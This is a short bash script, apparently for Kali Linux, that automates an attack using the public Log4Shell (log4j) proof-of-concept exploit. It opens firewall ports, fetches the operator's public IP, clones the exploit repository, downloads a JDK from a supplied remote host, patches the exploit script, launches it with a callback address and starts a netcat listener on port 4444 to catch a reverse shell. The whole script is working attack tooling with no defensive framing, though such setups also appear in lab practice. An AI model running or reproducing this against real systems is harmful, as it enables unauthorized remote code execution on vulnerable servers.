#!/bin/bash
#kali
#remember to port-forward if setup in home


echo "./thiscommand <1: desktop | cloud> <2: remote ip>"
echo "remember to portforward or open your firewall"
#read -r -p "your 2 variable: "

if [ -z "$2" ] ; then
    echo "please supply remote ip" 
    exit 0
fi


sudo ufw allow 8000
sudo ufw allow 4444

var_my_ip=$(curl -i ipinfo.io | grep "ip\"" | awk -F '\"' '{print $4}')


sudo apt-get update
sudo apt-get install -y python-pip3 python-pip


if [ "$1" == "desktop" ] ; then
cd Desktop
elif [ "$1" == "cloud" ] ; then
cd ~/
fi

git clone https://github.com/kozmer/log4j-shell-poc
cd log4j-shell-poc
pip install -r requirements.txt
wget $2:8081/jdk-8u111-linux-x64.tar.gz
tar -xvf jdk-8u111-linux-x64.tar.gz
sed -i 's/jdk1.8.0.20/jdk1.8.0_111/g' poc.py


python3 poc.py --userip $var_my_ip --webport 8000 --lport 4444 & 

nc -nlvp 4444




# docker kill $(docker ps -q)
